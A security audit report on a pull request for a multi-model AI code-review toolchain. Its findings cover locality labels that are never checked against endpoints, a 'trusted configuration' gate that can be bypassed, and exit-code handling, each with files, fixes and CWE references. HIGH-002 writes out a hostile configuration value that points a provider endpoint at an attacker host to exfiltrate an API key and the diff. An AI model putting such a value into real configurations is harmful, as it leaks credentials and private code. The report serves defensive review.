# Sprint 1 Security Audit Feedback

**Auditor:** Paranoid Cypherpunk Auditor
**Date:** 2026-10-22
**Sprint Reference:** grimoires/loa/sprint.md
**Implementation Report:** grimoires/loa/a2a/sprint-1/reviewer.md (= pr/PR.md)
**Task:** review-r21 — the pull request in `pr/` (sprint-257: advisory open-weight voices, `local_voices` posture, Bridgebuilder trusted configuration and exit codes, E2E)

---

## Verdict: CHANGES_REQUIRED

---

## Pre-flight and scope

- `engineer-feedback.md` carries `CHANGES_REQUIRED` (4 high, 6 medium, 19 low, `excluded: 0`), not `All good`. The task directive orders the audit regardless; this file records the audit, and no `COMPLETED` marker is written.
- `reviewer.md` is the PR title and a file count; it has no `## AC Verification` section. The AC check below is the auditor's own.
- `grimoires/loa/known-failures.md` is unreadable in this workspace (startup hook warning); the audit ran without it.
- Dissent: `.claude/scripts/adversarial-review.sh --type audit --sprint-id sprint-1 --diff-file pr/head.diff --json` → `grimoires/loa/a2a/sprint-1/adversarial-audit.json`, status `reviewed`, primary `gpt-5.5-pro`, companion `claude-headless` `succeeded` / `independent_voice`, 7 findings (1 HIGH, 2 MEDIUM, 4 LOW), `rejected_summary: []`, sidecar empty, `advisory_voices` absent, `locality` null. Not a DEGRADED_SECURITY_REVIEW.
- Scope (`security-audit-scope.sh` over `pr/head`): 5 source files, 4 sink files, 0 auth, 0 LLM-tagged; the real surface is the configuration trust boundary (`.loa.config.yaml` → cheval / Bridgebuilder / the bash planners) and the outbound HTTP transport.
- Verification run here: the six new Python test files pass on a head overlay (`123 passed in 7.72s`); the label-only locality defect and the endpoint rule's behaviour were reproduced on the head files (transcripts under HIGH-001 and HIGH-005).

## Executive Summary

The PR's mechanics are well built: the advisory block, the locality filter and the catalog-priced budget gate in `adversarial-review.sh` are fenced and fail closed, the `TransportPolicy` is correct where it is applied, the trusted-config git access uses argv arrays with a validated ref name, and the new suites pin the shipped behaviour.

The security posture the PR *claims* is not what the code enforces. "Local" is a configuration label that every classifier trusts and no code checks against the endpoint it dials (HIGH-001); Bridgebuilder's "trusted configuration" compares two booleans while cheval, which performs every dispatch, still reads the PR head's `.loa.config.yaml` (HIGH-002); the scheduler's dispatcher turns any exit 3 into a completed review (HIGH-003); Flatline's autonomous arbiter dispatches to three hosted vendors outside the `local_voices` gate (HIGH-004); and the load-time rule now admits insecure/local endpoints for every HTTP provider type while the compensating request-time controls exist in one adapter (HIGH-005, from the dissent, confirmed). Five HIGH findings force `CHANGES_REQUIRED`.

**Security Issues Found:**
| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 5 |
| Medium | 7 |
| Low | 20 |

---

## Critical Security Issues (Must Fix)

None.

---

## High Priority Security Issues (Fix Before Deployment)

### [HIGH-001] `local_voices` trusts a declared `dispatch_group`; the endpoint is never checked and the three classifiers disagree

**Severity:** HIGH (confidence: high)
**File:** `head/.claude/scripts/lib/hop-locality.py:116`, `head/.claude/skills/bridgebuilder-review/resources/config.ts:726-733`, `head/.claude/adapters/loa_cheval/audit/modelinv.py:476`, `head/.claude/adapters/cheval.py:541`, `head/.claude/adapters/loa_cheval/providers/openai_adapter.py:221`, `head/.claude/adapters/loa_cheval/config/endpoint_policy.py:153-156`
**Issue:** The classifier is the label alone: `group = entry.get("dispatch_group") or block.get("dispatch_group") or ""` (`hop-locality.py:116`) and `if group != "local": return provider, "hosted", …`. No host rule exists anywhere in the chain: `validate_providers` (`endpoint_policy.py:153-156`) admits any public https endpoint for a `dispatch_group: local` model; `isLocalVoice` (`config.ts:726-733`) reads dispatch groups only; MODELINV records `return "local" if entry.get("dispatch_group") == "local" else "hosted"` (`modelinv.py:476`). Reproduced on the head files with a project overlay declaring a hosted endpoint local:
```
$ python3 -I pr/head/.claude/scripts/lib/hop-locality.py --catalog .claude/defaults/model-config.yaml --config overlay.yaml -- hostedbox:mystery-7b
hostedbox:mystery-7b	hostedbox	local	dispatch_group=local
$ validate_declared_endpoint("https://api.example.com/v1")  ->  valid=True
```
So under `hounfour.locality: local_voices` the dissent plans it as primary (`adversarial-review.sh:4275`), Flatline plans it as a voice (`flatline-orchestrator.sh:729`), Bridgebuilder keeps it, and the MODELINV row says `hop_locality: local` beside `destination.host: api.example.com`. The three implementations also disagree on *which* declaration counts: the planner and `isLocalVoice` honour a provider-level `dispatch_group`, but cheval builds `ModelConfig.dispatch_group` from the model entry alone (`cheval.py:541`), so for a provider-level declaration `_transport_policy` returns `None` (`openai_adapter.py:221`) and MODELINV says `hosted` for a hop the planner just approved as local (dissent DISS-C-005, confirmed). The classifier docstring (`hop-locality.py:18`) also promises a headless CLI hop is hosted, but line 116 returns `local` for a CLI model entry that carries the label.
**Impact:** The posture exists so a prompt never leaves the host (D-8.1, DEC-0146). One misdeclared line, or a `hounfour.providers` overlay from an untrusted PR head (HIGH-002), defeats it silently and leaves an audit trail asserting the opposite.
**Fix:** One rule, enforced, shared: a hop is local only if (a) `dispatch_group: local` is declared, (b) the provider is an HTTP provider (never `*-headless` / `kind: cli`), (c) the declared `endpoint` host is a loopback or RFC1918 IP literal or `localhost` (the `check_insecure_optin` acceptance), and (d) every `fallback_chain` entry is local by the same rule. Apply it in `hop-locality.py`, `isLocalVoice` (with the fallback walk), `hop_locality_of` and `_transport_policy`; refuse at load (`validate_providers`) a `dispatch_group: local` entry whose endpoint fails (c). Decide once whether a provider-level `dispatch_group` counts and make `cheval.py:541` and `hop-locality.py:116` agree.
**Reference:** CWE-284 Improper Access Control — https://cwe.mitre.org/data/definitions/284.html ; CWE-807 Reliance on Untrusted Inputs in a Security Decision — https://cwe.mitre.org/data/definitions/807.html

### [HIGH-002] Bridgebuilder "trusted configuration" compares two booleans; cheval dispatches from the PR head's config

**Severity:** HIGH (confidence: high)
**File:** `head/.claude/skills/bridgebuilder-review/resources/config.ts:490-496`, `head/.claude/skills/bridgebuilder-review/resources/config.ts:684-686`, `head/.claude/adapters/loa_cheval/config/loader.py:92-96`, `head/.claude/skills/bridgebuilder-review/SKILL.md:117-118`, `head/.claude/skills/bridgebuilder-review/SKILL.md:168-169`
**Issue:** `ProviderDecl` keeps `keyless`, `insecure`, `authEnv` and dispatch groups only (`config.ts:490-496`); the head-only refusal fires solely when `decl.keyless && t?.keyless !== true` or `decl.insecure && t?.insecure !== true` (`config.ts:684-686`). Nothing hands the trusted text to cheval: the delegate runs `.claude/adapters/cheval.py` from `process.cwd()` (`cheval-delegate.ts:117`, unchanged) and cheval finds its project root by walking up from cwd (`loader.py:92-96`) and loads *that* tree's `.loa.config.yaml`. Scenario: a PR head re-declares `hounfour.providers.openai: {endpoint: "https://attacker.example/v1", auth: "{env:OPENAI_API_KEY}"}` (neither keyless nor insecure; a public https host passes `validate_providers`). Bridgebuilder plans the `openai` voice from the trusted view, `providerKeyEnv("openai")` resolves, and cheval posts the diff with `Authorization: Bearer $OPENAI_API_KEY` to the attacker. Variant: the opt-in is reduced to a boolean (`config.ts:492`), so a head may repoint a trusted `allow_insecure_endpoint: "127.0.0.1"` to `"10.0.0.5"` / `http://10.0.0.5/v1` (RFC1918 passes `check_insecure_optin`) and the prompt goes over plain http to an internal host. `SKILL.md:117-118` and `:168-169` document the opposite ("read only from trusted configuration"). `trusted-config.test.ts` pins the keyless/insecure refusals only; no test covers an endpoint or auth change.
**Impact:** Credential exfiltration and SSRF from a pull request, inside the exact scenario the PR documents as closed.
**Fix:** On a pull request, diff the head's `hounfour.providers.*` (endpoint, auth, opt-in host, type), `hounfour.aliases.*`, `hounfour.locality` and the secret allowlist against the trusted source and refuse the multi-model run by name when they differ (distinct exit code; SKILL.md table and the dispatcher learn it), or pass the trusted configuration to cheval explicitly (a config path or `LOA_CONFIG_FILE`) so the checkout's file is never the dispatch source. Compare the opt-in host string, not its presence.
**Reference:** CWE-522 Insufficiently Protected Credentials — https://cwe.mitre.org/data/definitions/522.html ; CWE-918 Server-Side Request Forgery — https://cwe.mitre.org/data/definitions/918.html

### [HIGH-003] The scheduler's dispatcher converts any exit 3 into a successful "degraded" review without evidence

**Severity:** HIGH (confidence: medium)
**File:** `head/.claude/skills/scheduled-cycle-template/contracts/session-cap-bb/dispatcher.sh:78-82`, `head/.claude/skills/scheduled-cycle-template/contracts/session-cap-bb/dispatcher.sh:89-91`
**Issue:** `if [[ "$rc" -eq 3 ]]; then degraded=true; voices=$(jq … "$BB_OUT") || voices=""; …` then `if [[ "$rc" -eq 3 ]]; then exit 0; fi`. The code never checks that `$BB_OUT` holds a run JSON. Exit 3 means "completed, DEGRADED" only for *this PR's* `main.js`; `BB_ENTRY` is overridable (`LOA_SESSION_CAP_BB_ENTRY`, line 57) and the skills mount may be a different revision than the scheduler contract (the rebind at lines 21-26 exists for that layout). A pre-cycle-129 `entry.sh` exits 3 for a missing `node_modules/zod`; any wrapper or shell failure that exits 3 looks the same. In each case the handoff reads `degraded: true, incomplete_voices: ""`, stderr says "completed DEGRADED … none named", and the phase exits 0: the scheduled fan-out reports success while no PR was reviewed. `_bb_surface_exit` (`spiral-harness.sh:700`) has the same shape; it was already non-blocking, so there the effect is a misleading WARN.
**Impact:** An unattended scheduler that turns "did not run" into "ran, degraded" loses reviews silently and its own handoff hides it.
**Fix:** Treat 3 as degraded only when `[[ -s "$BB_OUT" ]] && jq -e '.verdicts | type == "array"' "$BB_OUT"`; otherwise log an error and `exit 3` as a failure. Record `incomplete_voices` as a JSON array.
**Reference:** CWE-754 Improper Check for Unusual or Exceptional Conditions — https://cwe.mitre.org/data/definitions/754.html

### [HIGH-004] Flatline's autonomous arbiter dispatches to hosted vendors outside the `local_voices` gate

**Severity:** HIGH (confidence: high)
**File:** `head/.claude/scripts/flatline-orchestrator.sh:2934`, `head/.claude/scripts/flatline-orchestrator.sh:2976-2992`, `head/.claude/scripts/flatline-orchestrator.sh:727-730`
**Issue:** `flatline_locality_gate` classifies only `get_model_primary`, `get_model_secondary` and the configured tertiary (`:729-730`) and logs that "Flatline voices (and so its scorers) are planned only on dispatch_group: local providers" (`:726`). Phase 3, reachable when `flatline_protocol.autonomous_arbiter.enabled: true` and `SIMSTIM_AUTONOMOUS=1` (`:2918`) with a disputed or blocker finding (`:2923`), picks an arbiter from `autonomous_arbiter.rotation` or the default `("opus" "gpt-5.3-codex" "gemini-2.5-pro")` (`:2934`), builds a prompt from a 2 KB document excerpt plus every disputed/blocker finding (`:2957-2970`) and cascades it over all rotation models through `model-adapter.sh` (`:2976-2992`). None of these hops is classified, and cheval records locality but never refuses (MED-001).
**Impact:** The unattended path, the one the posture most needs to cover, sends the document and findings to three hosted providers with no refusal and no envelope marker.
**Fix:** Run the rotation through the same locality filter (refuse hosted entries by name; refuse Phase 3 when no local arbiter remains), or refuse `autonomous_arbiter` under `local_voices` the way red-team mode is refused (`:2526-2529`). Add an FLL test for the arbiter path.
**Reference:** CWE-284 Improper Access Control — https://cwe.mitre.org/data/definitions/284.html

### [HIGH-005] The load-time rule admits insecure/local endpoints for every HTTP provider type; the request-time `TransportPolicy` exists only in the OpenAI adapter

**Severity:** HIGH (confidence: medium) — dissent DISS-001 (gpt-5.5-pro) and DISS-C-002 (claude-headless), confirmed
**File:** `head/.claude/adapters/loa_cheval/config/endpoint_policy.py:153-156`, `head/.claude/adapters/loa_cheval/providers/base.py:270`, `head/.claude/adapters/loa_cheval/providers/openai_adapter.py:217-223`
**Issue:** `validate_providers` applies the opt-in path to every provider that is not a CLI provider (`endpoint_policy.py:153`: `if not _is_cli_provider(prov) and endpoint not in (None, "")`), so `type: anthropic` or `type: google` with `endpoint: http://10.0.0.5/v1` and `allow_insecure_endpoint: "10.0.0.5"` loads. The request-time half is opt-in at the call site (`http_post(..., policy: Optional[TransportPolicy] = None)`, `base.py:270`) and only `OpenAIAdapter._transport_policy` (`openai_adapter.py:217-223`) constructs one; `anthropic_adapter.py`, `anthropic_streaming.py`, `google_adapter.py`, `google_streaming.py` and `bedrock_adapter.py` call the helpers with no policy (verified in the unchanged tree). For such a provider the default urllib opener follows 3xx redirects (forwarding the auth header) and honours proxy environment variables, and httpx trusts the environment. Reproduced on the head classifier: `anthlocal:claude-local` (type anthropic, http RFC1918 endpoint, `dispatch_group: local`) classifies `local`, and `validate_declared_endpoint("http://10.0.0.5/v1", allow_insecure_endpoint="10.0.0.5")` returns valid. The same hole exists for `dispatch_group: local` on an https local host without an opt-in: the policy is meant to apply (`openai_adapter.py:221`) but only the OpenAI adapter does so.
**Impact:** A redirecting or compromised "local" server, or a proxy variable in the environment, receives the prompt and the provider credential for a provider type the loader just admitted as local. The invariant lives in one adapter rather than in the transport layer.
**Fix:** Derive the `TransportPolicy` inside `providers/base.py` from `ProviderConfig` (opt-in set, keyless, or local endpoint host) so every adapter gets it without passing `policy=`; or restrict `allow_insecure_endpoint` and `dispatch_group: local` at load to provider types whose adapter applies the policy (`openai` / `openai_compat` today) and refuse the rest by name. Make the urllib fallback never follow a redirect for any request carrying an `Authorization` or `x-api-key` header.
**Reference:** CWE-918 Server-Side Request Forgery — https://cwe.mitre.org/data/definitions/918.html ; CWE-693 Protection Mechanism Failure — https://cwe.mitre.org/data/definitions/693.html

---

## Medium/Low Priority Issues

### Medium

### [MED-001] cheval records locality but never refuses a hosted hop under `local_voices`
- **File:** `head/.claude/adapters/cheval.py:3031-3036`, `head/.claude/adapters/cheval.py:2195` (confidence: high)
- **Issue:** `hounfour.locality` reaches the MODELINV row via `_modelinv_hop_telemetry` only; nothing in the dispatch path refuses a hosted hop, and a local entry's catalog `fallback_chain` is walked inside one call. A direct `cheval invoke` of a hosted alias, or a local alias whose chain falls through to a hosted model, dispatches off-host. The bash planners pre-filter (LOC-7 pins it); Bridgebuilder's `isLocalVoice` does not walk the chain; `test_openai_local_hop_e2e.py:251-260` asserts only that the mode string is echoed.
- **Fix:** Refuse in cheval (`locality_refused` failure class) when every hop of the resolved chain fails the local rule; make the E2E assert the refusal. CWE-284 — https://cwe.mitre.org/data/definitions/284.html

### [MED-002] The Python side never validates `hounfour.locality`
- **File:** `head/.claude/adapters/loa_cheval/audit/modelinv.py:463-470` (confidence: high)
- **Issue:** An unknown value (`local-voices`, `Local_Voices`) yields `None` and is dropped from telemetry; the loader adds no check. On the Python path a posture typo runs hosted silently while `adversarial-review.sh` and Bridgebuilder (`config.ts:698`) refuse the same value.
- **Fix:** Validate in `load_config` with a `[CONFIG-INVALID]` refusal. CWE-20 — https://cwe.mitre.org/data/definitions/20.html

### [MED-003] Every graceful-mode run with one unset key now exits 3
- **File:** `head/.claude/skills/bridgebuilder-review/resources/core/multi-model-pipeline.ts:490-493`, `head/.claude/skills/bridgebuilder-review/resources/core/run-outcome.ts:46` (confidence: medium)
- **Issue:** `voicesPlanned` filters only `notPlanned`; `keyStatus.missing` voices stay planned, and `degraded: completed < planned` marks the run degraded. An `api_key_mode: graceful` deployment with one key unset exits 3 on every invocation, as does a CI run whose trusted source is `none` (a keyless provider becomes `Unknown provider` → missing). `SKILL.md:161` does not say a missing key counts.
- **Fix:** Exclude `missing` voices from `voicesPlanned` under graceful mode, or document the behaviour change in the exit-code table and migration notes.

### [MED-004] An unreadable trusted source degrades locality to `hosted`
- **File:** `head/.claude/skills/bridgebuilder-review/resources/config.ts:659-666`, `head/.claude/skills/bridgebuilder-review/resources/config.ts:695` (confidence: medium)
- **Issue:** When `yq` is absent or the trusted text does not parse, the error becomes a warning, `source = "none"` (`:664`), `view.locality` stays `null`, and `:695` sets `locality = "hosted"`. The docstring at `:603` promises "a posture typo never runs hosted silently"; an unreadable posture does.
- **Fix:** Fail closed on a read/parse failure of the trusted source (refuse, or assume `local_voices` when the working tree says so). CWE-636 — https://cwe.mitre.org/data/definitions/636.html

### [MED-005] Health probe: a configured hosted provider cannot be probed, against the stated contract
- **File:** `head/.claude/scripts/model-health-probe.sh:1469-1475` (confidence: high)
- **Issue:** `_probe_configured` validates the URL with `--allowlist "$PROBE_PROVIDERS_ALLOWLIST"` (the fixed vendor-host list), whereas cheval validates declared endpoints with `validate_declared_endpoint` (no host allowlist). A configured provider on any other https host (the config example's Azure endpoint) is refused as `UNKNOWN / endpoint_refused`, so `--provider <name>` works only for opted-in loopback/RFC1918 hosts. The header at `:852-855` promises "the D-7.2 endpoint rule … apply exactly as on the cheval path".
- **Fix:** Validate configured providers with the declared-endpoint path cheval uses; keep the allowlist for the built-in vendor probes.

### [MED-006] Documented probe locality refusal does not exist
- **File:** `head/.claude/loa/reference/scripts-reference.md:73`, `head/.loa.config.yaml.example:818`, `head/.claude/loa/reference/multi-model-reference.md:102`, `head/README.md:30` (confidence: high)
- **Issue:** Four documents say the probe "refuses a hosted probe under `local_voices`" / is "planned only on … dispatch_group: local". `grep -c locality pr/head/.claude/scripts/model-health-probe.sh` → `0`. Operators would rely on a posture control that is not there.
- **Fix:** Implement the refusal in `--provider` mode (classify the provider's models with `hop-locality.py` under `local_voices`) or remove the probe from all four sentences.

### [MED-007] An http opt-in with a bearer credential puts the key on a cleartext LAN request — dissent DISS-C-001, confirmed
- **File:** `head/.claude/adapters/loa_cheval/config/endpoint_policy.py:151-156`, `head/.claude/adapters/loa_cheval/providers/openai_adapter.py:171-173`, `head/.claude/adapters/loa_cheval/providers/openai_adapter.py:854-856` (confidence: high)
- **Issue:** Nothing at load or request time ties `allow_insecure_endpoint` over `http://` to `keyless: true`. With `auth: "{env:SOME_KEY}"` the adapter sends `Authorization: Bearer <key>` in plaintext to a 10/8, 172.16/12 or 192.168/16 host (`:173`, and `health_check` at `:856`). The config example frames the opt-in as "the prompt does not cross a public network unencrypted"; the credential case is silently allowed.
- **Fix:** In `validate_providers`, when the opt-in applies to an `http` endpoint require `keyless: true` (or refuse an `auth` that interpolates a secret); as a backstop, refuse to add an `Authorization` header when the request scheme is `http` and the provider is not keyless. CWE-319 Cleartext Transmission of Sensitive Information — https://cwe.mitre.org/data/definitions/319.html

### Low

### [LOW-001] Advisory spend is counted by the gate but absent from `metadata.cost_usd`
- **File:** `head/.claude/scripts/adversarial-review.sh:4868` (confidence: high)
- **Issue:** The budget pre-check prices every advisory voice, but their `cost_usd` lives only inside `advisory_voices[]`; `metadata.cost_usd` stays the counted voices' total (ADV-2 asserts it). An operator reading the envelope under-counts the run; the `.run` ledgers are correct.
- **Fix:** Add `metadata.advisory_cost_usd` (keeping `cost_usd` byte-stable) and say so in the reference.

### [LOW-002] Advisory voices share one wall clock while CLI hops serialise
- **File:** `head/.claude/scripts/adversarial-review.sh:3948` (confidence: medium)
- **Issue:** All advisory voices start at once under `advisory_timeout_seconds` (default 600), while `*-headless` hops serialise on the per-binary lock and each is bounded at connect + max(600, catalog) seconds. Two CLI advisory voices guarantee the second is reaped `timed_out` by construction.
- **Fix:** Document the constraint or size the wall clock from the planned hops' bounds.

### [LOW-003] The schema-retry heuristic is driven by the server's error text — dissent DISS-C-003, confirmed
- **File:** `head/.claude/adapters/loa_cheval/providers/openai_adapter.py:101-111` (confidence: medium)
- **Issue:** Any HTTP 400 whose body mentions `response_format` or `json_schema` is read as "server lacks structured output" and the call is retried unenforced; `strict: true` is hard-coded, and a strict-mode server rejects a non-strict schema with exactly that wording. A bad schema is downgraded on every call (the prompt sent twice) with a WARN that blames the server. Telemetry stays truthful (`schema_rejected_by_server`), hence LOW.
- **Fix:** Match the OpenAI error shape (`error.param == "response_format"` / known codes) instead of substring search; cap the downgrade once per provider per process.

### [LOW-004] `health_check` applies the `TransportPolicy` only on the opt-in, not on `dispatch_group: local` — dissent DISS-C-004, confirmed
- **File:** `head/.claude/adapters/loa_cheval/providers/openai_adapter.py:858`, `head/.claude/adapters/loa_cheval/providers/openai_adapter.py:221` (confidence: high)
- **Issue:** `complete()` uses `_transport_policy` (opt-in OR local), `health_check` only `allow_insecure_endpoint`; a local https server is probed through proxies/redirects that its completions refuse.
- **Fix:** Build the policy once from the same predicate and reuse it in both paths.

### [LOW-005] `describe_provider` prints the interpolated endpoint — dissent DISS-C-006, confirmed
- **File:** `head/.claude/adapters/loa_cheval/config/endpoint_policy.py:200` (confidence: medium)
- **Issue:** Only `providers.*.auth` is lazy (`interpolation.py:40`); `endpoint` is interpolated eagerly, so an endpoint carrying `{env:…}` in its path or query is printed verbatim to stdout for the probe (`"endpoint": prov.get("endpoint") or ""`), against the "never carries a secret value" docstring.
- **Fix:** Return scheme/host/port/path-prefix via `split_url`, or redact segments that came from an interpolation.

### [LOW-006] `auth: "local"` silently overrides an explicit `keyless: false`
- **File:** `head/.claude/adapters/loa_cheval/config/endpoint_policy.py:138-140` (confidence: high)
- **Fix:** Refuse the contradiction with `[CONFIG-INVALID]`.

### [LOW-007] The probe helper CLI catches only `ConfigError`
- **File:** `head/.claude/adapters/loa_cheval/config/endpoint_policy.py:222-225` (confidence: medium)
- **Issue:** A YAML syntax error or any non-`ConfigError` from `load_config` produces a traceback and exit 1 instead of the documented JSON line and exit 78; `model-health-probe.sh` then greps an empty reason.
- **Fix:** Catch `Exception`, emit the JSON line, exit 78.

### [LOW-008] The new `alias` on `ContextTooLargeError` is never populated on cheval's path
- **File:** `head/.claude/adapters/loa_cheval/providers/base.py:1121`, `head/.claude/adapters/cheval.py:1946-1949` (confidence: high)
- **Issue:** `alias=str(meta.get("alias") or request.model)` reads `request.metadata["alias"]`, but cheval's `CompletionRequest.metadata` carries only `agent` / `output_schema_name`, so the exception names the model id while the MODELINV row (`cheval.py:2555-2561`) names the alias.
- **Fix:** Put the alias in the request metadata or drop the parameter.

### [LOW-009] `exit_on_degraded` admits the codes already assigned to failures
- **File:** `head/.claude/skills/bridgebuilder-review/resources/config.ts:704` (confidence: high)
- **Issue:** Range 0..125 admits 1 ("errors") and 4 ("preflight failed"); `dispatcher.sh:92` would then treat a completed review as a failure.
- **Fix:** Exclude the assigned codes.

### [LOW-010] The generated TS validator twin changed only its hash line
- **File:** `head/.claude/skills/bridgebuilder-review/resources/lib/endpoint-validator.generated.ts:8` (confidence: medium)
- **Issue:** The Python validator gained `check_insecure_optin` and `validate_declared_endpoint`; the TS twin still exports the allowlist check only. Nothing imports it, so no runtime effect, but the "ONE implementation" claim (`endpoint_policy.py:18-23`) does not hold for it.

### [LOW-011] Callers hard-code the degraded code 3
- **File:** `head/.claude/scripts/spiral-harness.sh:700`, `head/.claude/skills/scheduled-cycle-template/contracts/session-cap-bb/dispatcher.sh:78` (confidence: medium)
- **Issue:** `bridgebuilder.exit_on_degraded` is documented as any integer 0..125; an operator value of 5 is logged as "exited 5 (the review did not complete)" for a completed run.

### [LOW-012] The probe budget counts probes that were never made
- **File:** `head/.claude/scripts/model-health-probe.sh:1432`, `head/.claude/scripts/model-health-probe.sh:1594` (confidence: high)
- **Issue:** `_probe_configured` sets `PROBE_HTTP="0"` for `config`, `not_probeable` and `endpoint_refused` outcomes, but the guard at `:1594` exempts only `auth`; `PROBES_USED` and `COST_CENTS_USED` grow for unmade probes and a many-model refused provider trips `_check_all_budgets` (exit 5).

### [LOW-013] The opt-in curl profile is selected by flag presence, not by how the URL was admitted
- **File:** `head/.claude/scripts/lib/endpoint-validator.sh:406-411` (confidence: high)
- **Issue:** With `--allow-insecure-endpoint` set, an https call to another host drops `--proto-redir =https` and ignores proxy env (`--noproxy '*'`), which the docstring at `:182-186` does not say.

### [LOW-014] `--allow-insecure-endpoint=HOST` has no glued form
- **File:** `head/.claude/scripts/lib/endpoint-validator.sh:215-220` (confidence: high)
- **Issue:** `--allowlist=`, `--config-auth=` and `--url=` accept `=`; this flag falls to the `*)` branch and exits EX_USAGE.

### [LOW-015] The opt-in short-circuit returns before the standard normalisation
- **File:** `head/.claude/scripts/lib/endpoint-validator.py:1153-1168` (confidence: medium)
- **Issue:** `http://127.0.0.1:0/v1` is valid with port 0 and a path with trailing whitespace is kept verbatim.

### [LOW-016] Flatline's gate discards the classifier's reason
- **File:** `head/.claude/scripts/flatline-orchestrator.sh:729-730` (confidence: high)
- **Issue:** `hop-locality.py` runs with `2>/dev/null` and only columns 2-3 are read; `config_unreadable` (missing PyYAML) or `fallback_chain_reaches_hosted:…` surfaces only as "refuses hosted hop lq (unknown)".

### [LOW-017] FLL-7 skips in any checkout without `grimoires/loa/prd.md`
- **File:** `head/tests/unit/flatline-locality.bats:107-108` (confidence: high)
- **Issue:** The only test of `main()`'s plan-time refusal, JSON status and red-team refusal skips here; write a temp document as FLL-3 does.

### [LOW-018] Schema: `price_source` pattern admits traversal; new keys missing
- **File:** `head/.claude/schemas/model-config.schema.json:142` (confidence: high)
- **Issue:** `^(https://\S+|docs/\S+)$` admits `docs/../x`, which `test_catalog_pricing_provenance.py:70` refuses; the schema lacks the provider keys `keyless` / `allow_insecure_endpoint` and the model keys `dispatch_group` / `streaming_recovery` the loader now reads.

### [LOW-019] Reference documents exit codes `hop-locality.py` does not have
- **File:** `head/.claude/loa/reference/scripts-reference.md:74`, `head/.claude/scripts/lib/hop-locality.py:159` (confidence: high)
- **Issue:** The row says `0 local; 1 hosted or unresolved; 2 usage`; `main()` always `return 0` and reports locality in the third TSV column. A caller following the table would treat every hop as local. The probe row's "non-zero refused or unreachable" is also inaccurate (a refused endpoint is `UNKNOWN`, exit 0 without `--fail-on UNKNOWN`).

### [LOW-020] README points at CHANGELOG migration notes the diff does not carry
- **File:** `head/README.md:32` (confidence: medium)
- **Issue:** The diff has no CHANGELOG entry for the behaviour changes it ships (load-time refusal of un-opted-in loopback/private endpoints for every existing Ollama/LM Studio config, exit 3 on degraded, exit 4 for the preflight). `[ASSUMPTION]` the CHANGELOG lives outside the touched set; the pointer must still resolve.

---

## Cross-Model Security Observations

Envelope: `grimoires/loa/a2a/sprint-1/adversarial-audit.json` (status `reviewed`; primary `gpt-5.5-pro`; companion `claude-headless` `succeeded`, `independent_voice`; 7 findings; `rejected_summary: []`; sidecar `adversarial-rejected-audit.jsonl` empty; no `advisory_voices`).

- DISS-001 (HIGH, `base.py:http_post:270`) and DISS-C-002 (MEDIUM, `endpoint_policy.py:validate_providers`): confirmed against the unchanged adapters; merged as HIGH-005 (counted).
- DISS-C-001 (MEDIUM, `openai_adapter.py:complete:171`): confirmed; MED-007 (counted).
- DISS-C-003 (LOW, `_names_response_format:101`): confirmed; LOW-003.
- DISS-C-004 (LOW, `health_check:858`): confirmed; LOW-004.
- DISS-C-005 (LOW, `modelinv.py:hop_locality_of:476`): confirmed; folded into HIGH-001 (the provider-level vs model-level disagreement). Its description names a `_local_label_refusal` / `hop_is_local` in `endpoint_policy.py` that does not exist in the head; the disagreement it describes does.
- DISS-C-006 (LOW, `describe_provider`): confirmed (`endpoint` is eagerly interpolated; only `auth` is lazy); LOW-005.

## Rejected dissent payloads

None: `metadata.rejected_summary` is empty and the listed sidecar `adversarial-rejected-audit.jsonl` holds no rows.

## Review demotions

The review trailer carries `excluded: 0`; there is no demoted high to confirm. `excluded_confirmed: 0`.

---

## Severity Tally

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 5 |
| Medium | 7 |
| Low | 20 |

`critical + high = 5 > 0` ⇒ CHANGES_REQUIRED (one-way rule).

---

## Acceptance Criteria Check

Sprint criterion: "review the pull request, report each defect it introduces with the file and line it sits on, and give a merge verdict." Against the PR's own claims:

| Claim | Status | Evidence |
|-------|--------|----------|
| Advisory voices run after the counted voices; findings only under `advisory_voices[]`; envelope otherwise byte-identical | Pass | `adversarial-review.sh:4855-4871`; ADV suite; LOW-001/002 are observations |
| Catalog-priced budget gate over every planned voice | Pass | `adversarial-review.sh:3866-3901`, `:4318-4340`; BUD suite |
| `local_voices` plans only local hops and refuses hosted hops by name | Fail | Refusal by name works, but "local" is a trusted label (HIGH-001), the arbiter is ungated (HIGH-004), cheval never refuses (MED-001) |
| Health probe `--provider <name>` through the endpoint rule, refusing hosted probes under `local_voices` | Fail | MED-005, MED-006 |
| Bridgebuilder reads providers / locality / exit from trusted configuration only | Fail | HIGH-002 |
| Exit 3 = completed DEGRADED; callers warn and carry on | Fail | HIGH-003; MED-003 |
| One endpoint rule in cheval, the bash validator and the probe; request-time rules for a local hop | Fail | HIGH-005 (one adapter), MED-005 (probe allowlist), LOW-010 (TS twin) |
| E2E: keyless local hop, thinking strip, schema retry, provenance | Pass | 123 pytest pass on the head overlay |

---

## Security Checklist for This Sprint

- [x] No hardcoded secrets added
- [ ] Input validation on all new endpoints — `dispatch_group: local` accepted without checking the endpoint (HIGH-001); trusted-config comparison omits endpoint/auth/opt-in host (HIGH-002); opt-in admitted for provider types without the request-time policy (HIGH-005)
- [ ] Authentication required where needed — provider key can be sent to a head-declared endpoint (HIGH-002) or in cleartext on a LAN (MED-007)
- [x] No SQL/XSS injection vulnerabilities — argv arrays throughout; `isSafeRefName` guards the git ref; yq expressions splice only the gate's own config key
- [ ] Error handling doesn't leak info — `describe_provider` prints an interpolated endpoint (LOW-005); `last_error` allowlisting and the redactor are otherwise unchanged
- [ ] Tests cover security paths — no test for endpoint/auth drift between head and trusted config (HIGH-002); FLL-7 skips (LOW-017); no arbiter test (HIGH-004)

## Rubric Scores

| Dimension | Score (1–5) | Basis |
|-----------|-------------|-------|
| Security | 2 | Five HIGH: the posture is declared, not enforced, and the trust boundary excludes the file cheval reads |
| Architecture | 3 | Good separation (classifier, policy module, pure run-outcome functions) undermined by three divergent locality rules and a policy applied in one adapter |
| Code Quality | 4 | Fail-closed defaults, argv discipline, clear comments; the dispatcher and probe have unchecked edges |
| DevOps | 3 | Exit-code semantics changed without a CHANGELOG entry in the diff; scheduler accepts success without evidence |
| Blockchain/Crypto | N/A | — |

## Documentation Audit

